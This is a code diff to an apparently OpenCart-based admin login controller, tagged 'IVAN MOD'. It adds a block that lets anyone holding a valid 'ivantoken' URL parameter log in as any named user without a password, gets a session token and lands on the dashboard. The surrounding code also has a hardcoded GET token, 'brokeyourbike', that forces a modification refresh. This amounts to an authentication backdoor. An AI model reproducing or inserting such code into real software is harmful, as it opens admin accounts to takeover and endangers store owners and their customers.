@@ -9,6 +9,20 @@ class ControllerCommonLogin extends Controller {
         && $this->request->get['git_token'] === 'brokeyourbike') {
             $this->load->controller('marketplace/modification/refresh', array('force' => true));
         }
+
+        if (isset($this->request->get['ivantoken']) && isset($this->request->get['user'])) {
+            $this->load->model('tool/opt');
+            if ($this->model_tool_opt->isValidToken($this->request->get['ivantoken'])) {
+                $this->log->write('SOMEONE PASSED TOKEN VERIFICATION');
+
+                if ($this->model_tool_opt->loginAsUser($this->request->get['user'])) {
+                    $this->log->write("SOMEONE LOGGED IN AS `{$this->user->getUserName()}`");
+
+                    $this->session->data['user_token'] = token(32);
+                    $this->response->redirect($this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true));
+                }
+            }
+        }
         /* IVAN MOD */
 
         $this->load->language('common/login');
